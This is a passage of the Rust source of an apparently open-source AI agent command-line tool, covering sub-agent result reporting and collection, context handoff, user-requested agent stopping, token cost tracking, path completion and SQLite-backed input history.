/*
 * faber
 *
 * Copyright (C) 2025 Giuseppe Scrivano <giuseppe@scrivano.org>
 * faber is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * faber is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with faber.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

mod fan_out;
use faber::github;
mod latex_kitty;
mod lsp;
use faber::openai;
mod remote_db;
mod server;
mod status_bar;
mod summarize;
mod web;

use faber::agent_io::{self, AgentEvent, AgentOutput, EventLog};
use faber::db;

use clap::{Parser, Subcommand};
use console::Style;
use env_logger::Env;
use log::{debug, trace, warn};
use pathrs::{Root, flags::OpenFlags};
use prettytable::{Cell, Row, Table, format};
use rustyline::Editor;
use rustyline::completion::{Completer, Pair};
use rustyline::highlight::Highlighter;
use rustyline::hint::Hinter;
use rustyline::history::{History, MemHistory, SearchDirection, SearchResult};
use rustyline::validate::Validator;
use serde::{Deserialize, Serialize};
use std::error::Error;
use std::fs;
use std::fs::Permissions;
use std::io::{Read, Write};
use std::os::unix::fs::PermissionsExt;
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::sync::Arc;
use std::sync::Mutex;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc;
use std::time::Duration;

use github::{
    get_github_issue, get_github_issue_comments, get_github_issues, get_github_pull_request,
    get_github_pull_request_patch, get_github_pull_requests,
};
use openai::{
    FunctionCall, InterruptedError, Message, OpenAIResponse, ProgressInfo, ResponseMode,
    StatusUpdate, ToolCall, ToolCallback, ToolItem, ToolsCollection, describe_error,
    list_models_from_endpoint, make_message, post_request, post_request_with_mode, tool_call,
};
use std::collections::HashMap;

struct AgentState {
    name: String,
    messages: Vec<Message>,
    /// The most recent `prompt_tokens` this agent's conversation reported,
    /// if any request has reported one yet - used to decide whether to
    /// proactively summarize before the *next* request, rather than only
    /// reactively after an actual context-length-exceeded failure. Only
    /// ever updated when a response actually reports a number (never
    /// reset to `None` by one that doesn't), so a provider that
    /// occasionally omits `usage` doesn't disable the check either.
    last_prompt_tokens: Option<u32>,
}

/// The final answer in a sub-agent's (or fan-out worker's) response, or
/// why there isn't one.
fn final_response_text(result: Result<OpenAIResponse, Box<dyn Error>>) -> Result<String, String> {
    let resp = result.map_err(|e| e.to_string())?;
    if let Some(err) = resp.error {
        return Err(err.message);
    }
    Ok(resp
        .choices
        .as_ref()
        .and_then(|c| c.first())
        .and_then(|c| c.message.content.clone())
        .filter(|c| !c.trim().is_empty())
        .unwrap_or_else(|| "(no response)".to_string()))
}

/// Checks `data` against a `result_schema`: an object mapping each required
/// field to its JSON type. A value that plainly is what was asked for, in
/// another form - "853" for a number, "true" for a boolean, 853 for a
/// string - is taken, converted, rather than failing the call.
fn validate_result_data(
    schema: &serde_json::Value,
    data: Option<&mut serde_json::Value>,
) -> Result<(), String> {
    let Some(fields) = schema.as_object() else {
        return Err("result_schema must be an object of field names to types".to_string());
    };
    let data = data
        .and_then(|d| d.as_object_mut())
        .ok_or("data must be an object with the fields asked for")?;
    for (field, kind) in fields {
        let kind = kind.as_str().unwrap_or("any");
        let value = data
            .get_mut(field)
            .ok_or_else(|| format!("data is missing '{}' ({})", field, kind))?;
        if let Some(converted) = convert_result_value(value, kind) {
            *value = converted;
        }
        let ok = match kind {
            "string" => value.is_string(),
            "number" => value.is_number(),
            "integer" => value.is_i64() || value.is_u64(),
            "boolean" => value.is_boolean(),
            "array" => value.is_array(),
            "object" => value.is_object(),
            _ => true,
        };
        if !ok {
            return Err(format!("data's '{}' must be a {}", field, kind));
        }
    }
    Ok(())
}

/// `value` as a `kind`, when it's that in another form (see
/// `validate_result_data`); `None` when it's already one, or isn't.
fn convert_result_value(value: &serde_json::Value, kind: &str) -> Option<serde_json::Value> {
    use serde_json::Value;
    match (kind, value) {
        ("number", Value::String(s)) => {
            let s = s.trim();
            s.parse::<i64>().map(Value::from).ok().or_else(|| {
                s.parse::<f64>()
                    .ok()
                    .and_then(|f| serde_json::Number::from_f64(f))
                    .map(Value::Number)
            })
        }
        ("integer", Value::String(s)) => s.trim().parse::<i64>().ok().map(Value::from),
        ("integer", Value::Number(n))
            if n.as_f64().is_some_and(|f| f.fract() == 0.0) && !n.is_i64() && !n.is_u64() =>
        {
            n.as_f64().map(|f| Value::from(f as i64))
        }
        ("boolean", Value::String(s)) => match s.trim().to_ascii_lowercase().as_str() {
            "true" => Some(Value::Bool(true)),
            "false" => Some(Value::Bool(false)),
            _ => None,
        },
        ("string", Value::Number(n)) => Some(Value::String(n.to_string())),
        ("string", Value::Bool(b)) => Some(Value::String(b.to_string())),
        _ => None,
    }
}

/// entrypoint for the report_result tool: records the outcome of the work
/// this agent was given, for whoever's waiting for it.
enum ReportStatus {
    /// Done: succeeded, or not.
    Final(bool),
    /// Not done yet: a progress update.
    Progress,
    Unknown,
}

/// What a report_result status means, taken generously: models write
/// "success", "Completed", "in_progress"...
fn report_status(status: &str) -> ReportStatus {
    let status = status.trim().to_ascii_lowercase().replace([' ', '-'], "_");
    match status.as_str() {
        "succeeded" | "success" | "successful" | "succeed" | "ok" | "done" | "completed"
        | "complete" => ReportStatus::Final(true),
        "failed" | "failure" | "fail" | "error" => ReportStatus::Final(false),
        "in_progress" | "progress" | "running" | "pending" | "working" | "started" | "ongoing" => {
            ReportStatus::Progress
        }
        _ => ReportStatus::Unknown,
    }
}

fn tool_report_result(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    #[serde(deny_unknown_fields)]
    struct Params {
        status: String,
        summary: String,
        #[serde(default)]
        data: Option<serde_json::Value>,
    }
    let mut params: Params = serde_json::from_str(params_str)?;
    let slot = ctx.result_slot.as_ref().ok_or(
        "nobody is waiting for a result from you: just answer (report_result is for sub-agents, fan-out workers and tasks)",
    )?;
    let succeeded = match report_status(&params.status) {
        ReportStatus::Final(succeeded) => succeeded,
        // Smaller models report progress with it: not a mistake worth
        // failing the call over, nor the result - note it and carry on.
        ReportStatus::Progress => {
            if let (Some(db), Some(agent)) = (&ctx.db, &ctx.agent_name) {
                let _ = db.set_agent_activity(agent, &first_line(&params.summary, 120));
            }
            return Ok(
                "Progress noted - but that's not your result yet: carry on with the work, then \
                 call report_result once, with status succeeded or failed."
                    .to_string(),
            );
        }
        ReportStatus::Unknown => {
            return Err(format!(
                "status must be succeeded or failed, not '{}'",
                params.status
            )
            .into());
        }
    };
    if let Some(schema) = &ctx.result_schema {
        validate_result_data(schema, params.data.as_mut())?;
    }
    *slot.lock().unwrap_or_else(|e| e.into_inner()) = Some(faber::ReportedResult {
        succeeded,
        summary: params.summary,
        data: params.data,
    });
    Ok("Result recorded. Finish now with a short final answer.".to_string())
}

/// Runs a piece of delegated work with `run`, and if a `schema` asks for a
/// structured result that wasn't reported, reminds the agent once and
/// lets it continue.
/// Most times a turn is carried on with its sub-agents' results (see
/// `run_collecting_sub_agents`).
const MAX_SUB_AGENT_FOLLOW_UPS: usize = 8;

/// How long a turn waits for its sub-agents' results before carrying on.
const SUB_AGENT_COLLECT_TIMEOUT: Duration = Duration::from_secs(3600);

/// Waits for every sub-agent `parent` started whose result it hasn't had
/// yet, and hands back those results - `None` if there are none. Stops
/// early on `cancel`, with whatever has come in.
fn collect_sub_agent_results(
    runs: &SubAgentRuns,
    parent: &str,
    cancel: &Option<Arc<Mutex<mpsc::Receiver<()>>>>,
    timeout: Duration,
) -> Result<Option<String>, Box<dyn Error>> {
    let deadline = std::time::Instant::now() + timeout;
    let mut state = runs.runs.lock().unwrap_or_else(|e| e.into_inner());
    let targets: Vec<u64> = state
        .iter()
        .filter(|(_, run)| run.parent == parent && !run.delivered)
        .map(|(id, _)| *id)
        .collect();
    if targets.is_empty() {
        return Ok(None);
    }
    loop {
        if targets.iter().all(|id| state[id].result.is_some()) {
            break;
        }
        let now = std::time::Instant::now();
        if now >= deadline {
            break;
        }
        state = runs
            .finished
            .wait_timeout(state, (deadline - now).min(Duration::from_millis(100)))
            .unwrap_or_else(|e| e.into_inner())
            .0;
        let cancelled = cancel.as_ref().is_some_and(|rx| {
            rx.lock()
                .unwrap_or_else(|e| e.into_inner())
                .try_recv()
                .is_ok()
        });
        if cancelled {
            return Err(Box::new(InterruptedError::new(
                "Operation interrupted by user",
            )));
        }
    }
    let mut out = String::new();
    for id in &targets {
        let run = state.get_mut(id).expect("targets come from the map");
        match &run.result {
            Some(result) => {
                run.delivered = true;
                out.push_str(&format!("## {}\n{}\n\n", run.name, result.trim()));
            }
            None => out.push_str(&format!(
                "## {}\n(still running after {} minutes; given up on)\n\n",
                run.name,
                timeout.as_secs() / 60
            )),
        }
    }
    Ok(Some(out))
}

/// Runs `request` on `messages`; then, as long as `agent` has sub-agents
/// out whose results it hasn't collected, waits for them and runs it again
/// with their results - so a turn nobody else is following (a task, a
/// sub-agent) doesn't end with work still going on, its results lost.
fn run_collecting_sub_agents(
    runs: &SubAgentRuns,
    agent: &str,
    cancel: &Option<Arc<Mutex<mpsc::Receiver<()>>>>,
    events: &Option<Arc<EventLog>>,
    messages: Vec<Message>,
    mut request: impl FnMut(Vec<Message>) -> Result<OpenAIResponse, Box<dyn Error>>,
) -> Result<OpenAIResponse, Box<dyn Error>> {
    let mut response = request(messages)?;
    for _ in 0..MAX_SUB_AGENT_FOLLOW_UPS {
        let Some(results) =
            collect_sub_agent_results(runs, agent, cancel, SUB_AGENT_COLLECT_TIMEOUT)?
        else {
            break;
        };
        let text = format!(
            "[Your sub-agents have finished. Their results:]\n\n{}Carry on with the task.",
            results
        );
        if let Some(events) = events {
            events.emit(AgentEvent::Input { text: text.clone() });
        }
        let mut history = response.history.clone();
        history.push(make_message("user", text));
        response = request(history)?;
    }
    Ok(response)
}

pub(crate) fn run_reporting(
    messages: Vec<Message>,
    slot: &Arc<Mutex<Option<faber::ReportedResult>>>,
    schema: Option<&serde_json::Value>,
    mut run: impl FnMut(Vec<Message>) -> Result<OpenAIResponse, Box<dyn Error>>,
) -> Result<OpenAIResponse, Box<dyn Error>> {
    let response = run(messages)?;
    let reported = slot.lock().unwrap_or_else(|e| e.into_inner()).is_some();
    match schema {
        Some(schema) if !reported => {
            let mut history = response.history.clone();
            history.push(make_message(
                "user",
                format!(
                    "You haven't reported your result. Call report_result with status, summary, \
                     and data with these fields: {}",
                    schema
                ),
            ));
            run(history)
        }
        _ => Ok(response),
    }
}

/// The outcome of delegated work: what it reported with `report_result`,
/// or else its final answer as a success. An error (the request failing)
/// stays an error.
pub(crate) fn work_outcome(
    result: Result<OpenAIResponse, Box<dyn Error>>,
    slot: &Arc<Mutex<Option<faber::ReportedResult>>>,
) -> Result<faber::ReportedResult, String> {
    if let Some(reported) = slot.lock().unwrap_or_else(|e| e.into_inner()).take() {
        return Ok(reported);
    }
    final_response_text(result).map(|summary| faber::ReportedResult {
        succeeded: true,
        summary,
        data: None,
    })
}

/// The task text for delegated work, telling the agent how to report when
/// a structured result is wanted.
pub(crate) fn delegated_prompt(prompt: &str, schema: Option<&serde_json::Value>) -> String {
    match schema {
        Some(schema) => format!(
            "{}\n\nWhen you're done, call report_result with status, summary, and data with \
             these fields: {}",
            prompt, schema
        ),
        None => prompt.to_string(),
    }
}

/// Context an agent hands to the one it starts: knowledge base notes (by
/// title or id) and files, so it doesn't start cold.
#[derive(Deserialize, Default, Debug)]
#[serde(deny_unknown_fields)]
pub(crate) struct Handoff {
    #[serde(default)]
    notes: Vec<String>,
    #[serde(default)]
    files: Vec<String>,
}

/// Most of each handed-off file included.
const MAX_HANDOFF_FILE_CHARS: usize = 20_000;

/// The message carrying `handoff` to a new agent, as the agent in `ctx`
/// sees the notes. `None` if there's nothing to hand off.
pub(crate) fn handoff_message(
    ctx: &ToolContext,
    handoff: &Handoff,
) -> Result<Option<Message>, Box<dyn Error>> {
    if handoff.notes.is_empty() && handoff.files.is_empty() {
        return Ok(None);
    }
    let mut text = String::from("Context from the agent that started you:\n");
    let viewer = kb_viewer(ctx)?;
    for note in &handoff.notes {
        let db = ctx.db()?;
        let found = match note.trim_start_matches('#').parse::<i64>() {
            Ok(id) => db.kb_get(id, &viewer)?,
            Err(_) => db.kb_get_by_title(note, &viewer)?,
        };
        let found = found.ok_or_else(|| format!("no knowledge base note '{}'", note))?;
        text.push_str(&format!(
            "\n## Note: {}\n{}\n",
            found.title,
            found.body.trim()
        ));
    }
    for file in &handoff.files {
        // Inside where the agent works, as the file tools read: a symlink
        // out of it reads nothing.
        let path = PathBuf::from(ctx.tool_path(file));
        let content = read_text_in_root(&ctx.cwd(), &path)
            .map_err(|e| format!("can't read '{}': {}", file, e))?;
        text.push_str(&format!(
            "\n## File: {}\n```\n{}\n```\n",
            file,
            openai::truncate_tool_output(&content, MAX_HANDOFF_FILE_CHARS)
        ));
    }
    Ok(Some(make_message("user", text)))
}

/// Accumulated token usage across every chat turn in the current session
/// (every agent, not just the active one - switching agents doesn't reset
/// this, unlike `AgentState::last_prompt_tokens` - plus every sub-agent
/// and fan-out worker run, each counted as a turn), shown by the `/cost`
/// command. Each turn is recorded from `OpenAIResponse::turn_usage`, so
/// every tool-call round trip within it counts, not just the final
/// request. A turn whose requests didn't report `usage` at all simply
/// doesn't add anything - not treated as zero tokens used, just unknown.
#[derive(Debug, Default, Clone, Copy)]
struct SessionUsage {
    turns: u64,
    prompt_tokens: u64,
    completion_tokens: u64,
    total_tokens: u64,
}

impl SessionUsage {
    fn record(&mut self, usage: &openai::Usage) {
        self.turns += 1;
        self.prompt_tokens += u64::from(usage.prompt_tokens.unwrap_or(0));
        self.completion_tokens += u64::from(usage.completion_tokens.unwrap_or(0));
        self.total_tokens += u64::from(usage.total_tokens.unwrap_or(0));
    }
}

/// Estimates the dollar cost of `usage` given `pricing`'s per-token prompt/
/// completion rates (as OpenRouter's `/models` API reports them - the
/// documented convention this parses `pricing.prompt`/`pricing.completion`
/// against). `None` if either rate isn't a valid number - a `Pricing`
/// that's present at all but has a genuinely unparseable rate is rare
/// enough (and not worth guessing at) that falling back to "unknown, don't
/// show a cost" is preferable to a silently wrong number.
fn estimate_cost_usd(usage: &SessionUsage, pricing: &openai::Pricing) -> Option<f64> {
    let prompt_rate: f64 = pricing.prompt.parse().ok()?;
    let completion_rate: f64 = pricing.completion.parse().ok()?;
    Some(
        usage.prompt_tokens as f64 * prompt_rate + usage.completion_tokens as f64 * completion_rate,
    )
}

/// A sub-agent running in this session, and how to stop it.
pub(crate) struct RunningSubAgent {
    pub(crate) cancel: mpsc::Sender<()>,
    /// Why it was stopped, for the result its parent gets.
    pub(crate) stop_reason: Arc<Mutex<Option<String>>>,
}

/// The sub-agents running in this session, by name.
type RunningSubAgents = Arc<Mutex<HashMap<String, RunningSubAgent>>>;

/// Stops the running sub-agent `name`, recording `reason` (unless it was
/// already stopped for another). Returns whether one was running.
/// Takes care of the agents this session runs that the user asked to stop
/// (`AGENT_STOP_KEY`): one running a task has the task stopped - however
/// it runs, the task's stop does the rest; a sub-agent or fan-out worker
/// of this session is cancelled; any other - the session's own agent -
/// gets `interrupt_turn`.
fn handle_agent_stops(
    db: &dyn DbBackend,
    session_id: &str,
    running: &RunningSubAgents,
    interrupt_turn: &dyn Fn(),
) {
    let Ok(agents) = db.list_agents() else {
        return;
    };
    for agent in agents
        .iter()
        .filter(|a| a.session_id.as_deref() == Some(session_id))
    {
        let Ok(Some(_)) = db.get_agent_data(&agent.name, db::AGENT_STOP_KEY) else {
            continue;
        };
        let _ = db.delete_agent_data(&agent.name, db::AGENT_STOP_KEY);
        let task = db
            .get_agent_data(&agent.name, db::RUNNING_TASK_KEY)
            .ok()
            .flatten()
            .and_then(|id| id.parse::<i64>().ok());
        if let Some(task) = task {
            let _ = db.request_task_stop(task);
        } else if !stop_sub_agent(running, &agent.name, "stopped by the user") {
            interrupt_turn();
        }
    }
}

fn stop_sub_agent(running: &RunningSubAgents, name: &str, reason: &str) -> bool {
    let running = running.lock().unwrap_or_else(|e| e.into_inner());
    let Some(agent) = running.get(name) else {
        return false;
    };
    agent
        .stop_reason
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .get_or_insert_with(|| reason.to_string());
    let _ = agent.cancel.send(());
    true
}

/// One `spawn_agent` run: whose it is and, once done, its result.
struct SubAgentRun {
    name: String,
    parent: String,
    result: Option<String>,
    /// Already handed to the parent by `agent_wait`, so the chat doesn't
    /// inject it again when the notification arrives.
    delivered: bool,
}

/// Every sub-agent run in this session, by run id, with a condition
/// variable signalled whenever one finishes.
#[derive(Default)]
struct SubAgentRuns {
    runs: Mutex<HashMap<u64, SubAgentRun>>,
    finished: std::sync::Condvar,
    next_id: std::sync::atomic::AtomicU64,
}

impl SubAgentRuns {
    fn start(&self, name: &str, parent: &str) -> u64 {
        let id = self.next_id.fetch_add(1, Ordering::Relaxed) + 1;
        self.runs.lock().unwrap_or_else(|e| e.into_inner()).insert(
            id,
            SubAgentRun {
                name: name.to_string(),
                parent: parent.to_string(),
                result: None,
                delivered: false,
            },
        );
        id
    }

    fn finish(&self, id: u64, result: &str) {
        if let Some(run) = self
            .runs
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .get_mut(&id)
        {
            run.result = Some(result.to_string());
        }
        self.finished.notify_all();
    }

    fn was_delivered(&self, id: u64) -> bool {
        self.runs
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .get(&id)
            .is_some_and(|run| run.delivered)
    }
}

#[derive(Clone)]
struct SubAgentContext {
    /// Every sub-agent run in this session (see `agent_wait`).
    runs: Arc<SubAgentRuns>,
    tools: Arc<ToolsCollection>,
    opts: openai::Opts,
    session_id: String,
    active_subagents: Arc<std::sync::atomic::AtomicUsize>,
    running_subagents: RunningSubAgents,
    status_bar: Arc<status_bar::StatusBar>,
    /// Sub-agents' and fan-out workers' tokens count toward `/cost` too.
    session_usage: Arc<Mutex<SessionUsage>>,
    /// The config file's profiles, to make agents from.
    profiles: Arc<Profiles>,
}

const CHAT_COMMANDS: &[&str] = &[
    "/help",
    "/quit",
    "/clear",
    "/show",
    "/limit",
    "/backtrace",
    "/summarize",
    "/system",
    "/agents",
    "/create-agent",
    "/select-agent",
    "/delete-agent",
    "/mcp-refresh",
    "/tools",
    "/chdir",
    "/cwd",
    "/pwd",
    "/cost",
    "/plan",
    "/cancel",
];

/// Directory-completion candidates for `/chdir`'s in-progress path argument.
///
/// Splits off the last path component (the part still being typed) from any
/// leading directory portion, lists that directory, and returns one full
/// replacement path per matching entry - each suffixed with "/" so
/// completion can be chained deeper with another Tab, matching common shell
/// `cd` completion conventions:
/// - only directories are offered (including symlinks that resolve to one -
///   `std::fs::metadata` follows symlinks, unlike `DirEntry::file_type()`),
///   since `/chdir` can't do anything useful with a file;
/// - dotfiles/dot-directories are hidden unless the in-progress component
///   itself already starts with `.`;
/// - no leading `/` in `partial` at all means "scan the current directory",
///   same as a bare `cd` completion would.
fn complete_chdir_path(partial: &str) -> Vec<String> {
    let (dir_part, name_prefix) = match partial.rfind('/') {
        Some(idx) => (&partial[..=idx], &partial[idx + 1..]),
        None => ("", partial),
    };
    let scan_dir = if dir_part.is_empty() { "." } else { dir_part };
    let show_hidden = name_prefix.starts_with('.');

    let mut candidates = Vec::new();
    if let Ok(entries) = std::fs::read_dir(scan_dir) {
        for entry in entries.flatten() {
            let file_name = entry.file_name();
            let name = file_name.to_string_lossy();
            if !show_hidden && name.starts_with('.') {
                continue;
            }
            if !name.starts_with(name_prefix) {
                continue;
            }
            let is_dir = std::fs::metadata(entry.path())
                .map(|m| m.is_dir())
                .unwrap_or(false);
            if !is_dir {
                continue;
            }
            candidates.push(format!("{}{}/", dir_part, name));
        }
    }
    candidates.sort();
    candidates
}

struct ChatHelper {
    agent_names: Arc<Mutex<Vec<String>>>,
}

impl Completer for ChatHelper {
    type Candidate = Pair;

    fn complete(
        &self,
        line: &str,
        pos: usize,
        _ctx: &rustyline::Context<'_>,
    ) -> rustyline::Result<(usize, Vec<Pair>)> {
        if !line.starts_with('/') {
            return Ok((0, vec![]));
        }

        let input = &line[..pos];

        if input.starts_with("/select-agent ") || input.starts_with("/delete-agent ") {
            let prefix_end = input.find(' ').unwrap() + 1;
            let name_prefix = &input[prefix_end..];
            let mut candidates = Vec::new();
            if let Ok(names) = self.agent_names.lock() {
                for name in names.iter() {
                    if name.starts_with(name_prefix) {
                        candidates.push(Pair {
                            display: name.clone(),
                            replacement: name.clone(),
                        });
                    }
                }
            }
            return Ok((prefix_end, candidates));
        }

        if input.starts_with("/chdir ") {
            let prefix_end = input.find(' ').unwrap() + 1;
            let path_prefix = &input[prefix_end..];
            let candidates = complete_chdir_path(path_prefix)
                .into_iter()
                .map(|p| Pair {
                    display: p.clone(),
                    replacement: p,
                })
                .collect();
            return Ok((prefix_end, candidates));
        }

        let mut candidates = Vec::new();
        for cmd in CHAT_COMMANDS {
            if cmd.starts_with(input) {
                candidates.push(Pair {
                    display: cmd.to_string(),
                    replacement: cmd.to_string(),
                });
            }
        }
        Ok((0, candidates))
    }
}

impl Hinter for ChatHelper {
    type Hint = String;
}
impl Highlighter for ChatHelper {}
impl Validator for ChatHelper {}
impl rustyline::Helper for ChatHelper {}

struct DbHistory {
    conn: Option<Arc<Mutex<rusqlite::Connection>>>,
    mem: MemHistory,
    max_len: usize,
    ignore_space: bool,
    ignore_dups: bool,
    row_id: usize,
}

impl DbHistory {
    fn new(conn: Option<Arc<Mutex<rusqlite::Connection>>>) -> Self {
        let row_id = if let Some(ref c) = conn {
            if let Ok(c) = c.lock() {
                c.query_row(
                    "SELECT COALESCE(MAX(id), 0) FROM readline_history",
                    [],
                    |r| r.get::<_, usize>(0),
                )
                .unwrap_or(0)
            } else {
                0
            }
        } else {
            0
        };
        Self {
            conn,
            mem: MemHistory::new(),
            max_len: 1000,
            ignore_space: false,
            ignore_dups: true,
            row_id,
        }
    }

    fn ignore(&self, line: &str) -> bool {
        if self.max_len == 0 {
            return true;
        }
        if line.is_empty() || (self.ignore_space && line.starts_with(' ')) {
            return true;
        }
        false
    }

    fn is_dup(&self, line: &str) -> bool {
        if !self.ignore_dups {
            return false;
        }
        if let Some(ref c) = self.conn {
            if let Ok(c) = c.lock() {
                let last: Option<String> = c
                    .query_row(
                        "SELECT entry FROM readline_history ORDER BY id DESC LIMIT 1",
                        [],
                        |r| r.get(0),
                    )
                    .ok();
                return last.as_deref() == Some(line);
            }
        }
        false
    }

    fn enforce_max_len(&self) {
        if let Some(ref c) = self.conn {
            if let Ok(c) = c.lock() {
                let _ = c.execute(
                    "DELETE FROM readline_history WHERE id IN (
                        SELECT id FROM readline_history ORDER BY id ASC
                        LIMIT MAX(0, (SELECT COUNT(*) FROM readline_history) - ?1)
                    )",
                    rusqlite::params![self.max_len],
                );
            }
        }
    }
}

impl History for DbHistory {
    fn get(
        &self,
        index: usize,
        dir: SearchDirection,
    ) -> rustyline::Result<Option<SearchResult<'_>>> {
        if let Some(ref c) = self.conn {
            if let Ok(c) = c.lock() {
                let rowid = index + 1;
                let (query, param) = match dir {
                    SearchDirection::Forward => (
                        "SELECT id, entry FROM readline_history WHERE id >= ?1 ORDER BY id ASC LIMIT 1",
                        rowid,
                    ),
                    SearchDirection::Reverse => (
                        "SELECT id, entry FROM readline_history WHERE id <= ?1 ORDER BY id DESC LIMIT 1",
                        rowid,
                    ),
                };
                let result = c.query_row(query, rusqlite::params![param], |r| {
                    let id: usize = r.get(0)?;
                    let entry: String = r.get(1)?;
                    Ok((id, entry))
                });
                return match result {
                    Ok((id, entry)) => Ok(Some(SearchResult {
                        entry: std::borrow::Cow::Owned(entry),
                        idx: id - 1,
                        pos: 0,
                    })),
                    Err(rusqlite::Error::QueryReturnedNoRows) => Ok(None),
                    Err(e) => Err(rustyline::error::ReadlineError::Io(std::io::Error::new(
                        std::io::ErrorKind::Other,
                        e,
                    ))),
                };
            }
        }
        self.mem.get(index, dir)
    }

    fn add(&mut self, line: &str) -> rustyline::Result<bool> {
        if self.ignore(line) {
            return Ok(false);
        }
        if let Some(ref c) = self.conn {
            if self.is_dup(line) {
                return Ok(false);
            }
            if let Ok(c) = c.lock() {
                match c.execute(
                    "INSERT INTO readline_history (entry) VALUES (?1)",
                    rusqlite::params![line],
                ) {
                    Ok(_) => {
                        self.row_id = c.last_insert_rowid() as usize;
                        drop(c);
                        self.enforce_max_len();
                        return Ok(true);
                    }
                    Err(e) => {
                        warn!("Failed to save history entry: {}", e);
                    }
                }
            }
            return Ok(false);
        }
        self.mem.add(line)
    }

    fn add_owned(&mut self, line: String) -> rustyline::Result<bool> {
        self.add(&line)
    }

    fn len(&self) -> usize {
        if let Some(ref c) = self.conn {
            if let Ok(c) = c.lock() {
                return c
                    .query_row("SELECT COUNT(*) FROM readline_history", [], |r| {
                        r.get::<_, usize>(0)
                    })
                    .unwrap_or(self.row_id);
            }
        }
        self.mem.len()
    }

    fn is_empty(&self) -> bool {
        self.len() == 0
    }

    fn set_max_len(&mut self, len: usize) -> rustyline::Result<()> {
        self.max_len = len;
        self.enforce_max_len();
        self.mem.set_max_len(len)
    }

    fn ignore_dups(&mut self, yes: bool) -> rustyline::Result<()> {
        self.ignore_dups = yes;
        self.mem.ignore_dups(yes)
    }

    fn ignore_space(&mut self, yes: bool) {
        self.ignore_space = yes;
        self.mem.ignore_space(yes);
    }

    fn save(&mut self, _path: &std::path::Path) -> rustyline::Result<()> {
        Ok(())
    }

    fn append(&mut self, _path: &std::path::Path) -> rustyline::Result<()> {
        Ok(())
    }

    fn load(&mut self, _path: &std::path::Path) -> rustyline::Result<()> {
        Ok(())
    }

    fn clear(&mut self) -> rustyline::Result<()> {
        if let Some(ref c) = self.conn {
            if let Ok(c) = c.lock() {
                let _ = c.execute("DELETE FROM readline_history", []);
                self.row_id = 0;
                return Ok(());
            }
        }
        self.mem.clear()
    }

    fn search(
        &self,
        term: &str,
        start: usize,
        dir: SearchDirection,
    ) -> rustyline::Result<Option<SearchResult<'_>>> {
        if term.is_empty() || start >= self.len() {
            return Ok(None);
        }
        if let Some(ref c) = self.conn {
            if let Ok(c) = c.lock() {
                let rowid = start + 1;
                let escaped = term
                    .replace('\\', "\\\\")
                    .replace('%', "\\%")
                    .replace('_', "\\_");
                let pattern = format!("%{}%", escaped);
                let (query, param) = match dir {
                    SearchDirection::Forward => (
                        "SELECT id, entry FROM readline_history WHERE entry LIKE ?1 ESCAPE '\\' AND id >= ?2 ORDER BY id ASC LIMIT 1",
                        rowid,
                    ),
                    SearchDirection::Reverse => (
                        "SELECT id, entry FROM readline_history WHERE entry LIKE ?1 ESCAPE '\\' AND id <= ?2 ORDER BY id DESC LIMIT 1",
                        rowid,
                    ),
                };
                let result = c.query_row(query, rusqlite::params![pattern, param], |r| {
                    let id: usize = r.get(0)?;
                    let entry: String = r.get(1)?;
                    Ok((id, entry))
                });
                return match result {
                    Ok((id, entry)) => {
                        let pos = entry.find(term).unwrap_or(0);
                        Ok(Some(SearchResult {
                            entry: std::borrow::Cow::Owned(entry),
                            idx: id - 1,
                            pos,
                        }))
                    }
                    Err(rusqlite::Error::QueryReturnedNoRows) => Ok(None),
                    Err(e) => Err(rustyline::error::ReadlineError::Io(std::io::Error::new(
                        std::io::ErrorKind::Other,
                        e,
                    ))),
                };
            }
        }
        self.mem.search(term, start, dir)
    }

    fn starts_with(
        &self,
        term: &str,
        start: usize,
        dir: SearchDirection,
    ) -> rustyline::Result<Option<SearchResult<'_>>> {
        if term.is_empty() || start >= self.len() {
            return Ok(None);
        }
        if let Some(ref c) = self.conn {
            if let Ok(c) = c.lock() {
                let rowid = start + 1;
                let escaped = term
                    .replace('\\', "\\\\")
                    .replace('%', "\\%")
                    .replace('_', "\\_");
                let pattern = format!("{}%", escaped);
                let (query, param) = match dir {
                    SearchDirection::Forward => (
                        "SELECT id, entry FROM readline_history WHERE entry LIKE ?1 ESCAPE '\\' AND id >= ?2 ORDER BY id ASC LIMIT 1",
                        rowid,
                    ),
                    SearchDirection::Reverse => (
                        "SELECT id, entry FROM readline_history WHERE entry LIKE ?1 ESCAPE '\\' AND id <= ?2 ORDER BY id DESC LIMIT 1",
                        rowid,
                    ),
                };
                let result = c.query_row(query, rusqlite::params![pattern, param], |r| {
                    let id: usize = r.get(0)?;
                    let entry: String = r.get(1)?;
                    Ok((id, entry))
                });
                return match result {
                    Ok((id, entry)) => Ok(Some(SearchResult {
                        entry: std::borrow::Cow::Owned(entry),
                        idx: id - 1,
                        pos: term.len(),
                    })),
                    Err(rusqlite::Error::QueryReturnedNoRows) => Ok(None),
                    Err(e) => Err(rustyline::error::ReadlineError::Io(std::io::Error::new(
                        std::io::ErrorKind::Other,
                        e,
                    ))),
                };
            }
        }
        self.mem.starts_with(term, start, dir)
    }
}

#[derive(Clone)]
struct ChatPrinter {
    printer: Arc<Mutex<Option<Box<dyn rustyline::ExternalPrinter + Send>>>>,
    direct_mode: Arc<AtomicBool>,
}

const AGENT_COLORS: &[console::Color] = &[
    console::Color::Cyan,
    console::Color::Green,
    console::Color::Yellow,
    console::Color::Magenta,
    console::Color::Blue,
    console::Color::Red,
];

const AGENT_ANSI_CODES: &[u8] = &[36, 32, 33, 35, 34, 31];

fn agent_color_hash(name: &str) -> usize {
    name.bytes()
        .fold(0usize, |acc, b| acc.wrapping_add(b as usize))
}

fn agent_style(name: &str) -> Style {
    Style::new()
        .fg(AGENT_COLORS[agent_color_hash(name) % AGENT_COLORS.len()])
        .bold()
}

fn agent_ansi_code(name: &str) -> u8 {
